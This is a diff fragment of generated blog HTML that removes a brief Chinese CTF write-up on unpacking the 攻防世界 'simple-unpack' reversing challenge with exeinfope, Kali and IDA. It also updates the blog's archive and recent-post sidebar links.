-      <a class="p-name article-title" href="/2022/02/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre-3/">攻防世界re_3</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="re-3-simple-unpack"><a href="#re-3-simple-unpack" class="headerlink" title="re_3__simple-unpack"></a>re_3__simple-unpack</h1><p>将下载的文件放入exeinfope<br><img src="/../photo/4.png"></p>
-<p>发现有壳<br>将其传入kali进行脱壳<br><img src="/../photo/5.png"></p>
-<p>再将文件传回Windows放入ida<br>在mian中得到flag<br><img src="/../photo/6.png"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/02/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre-3/" data-id="cl5ferydd000aegu97gom6hw9" data-title="攻防世界re_3" class="article-share-link">分享</a>
+      <a data-url="https://cczz1234.github.io/2022/03/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csrm-50/" data-id="cl6fvvmkp000emsu90p886dqb" data-title="攻防世界srm-50" class="article-share-link">分享</a>
       
       
       
@@ -649,7 +673,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li></ul>
     </div>
   </div>
 
@@ -662,23 +686,23 @@
       <ul>
         
           <li>
+            <a href="/2022/08/05/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DLoveSQL%201/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/05/mysql/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/05/web/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2022/03/28/buuctf-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt1/">buuctf--[ACTF新生赛2020]usualCrypt1</a>
           </li>
         
           <li>
             <a href="/2022/03/22/CrackRTF-1-buuctf/">CrackRTF 1---buuctf</a>
-          </li>
-        
-          <li>
-            <a href="/2022/03/21/coffee/">coffee</a>
-          </li>
-        
-          <li>
-            <a href="/2022/03/17/rsa-1-buuctf/">rsa 1 buuctf</a>
-          </li>
-        
-          <li>
-            <a href="/2022/03/15/buuctf%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/">buuctf刮开有奖</a>
           </li>
         
       </ul>
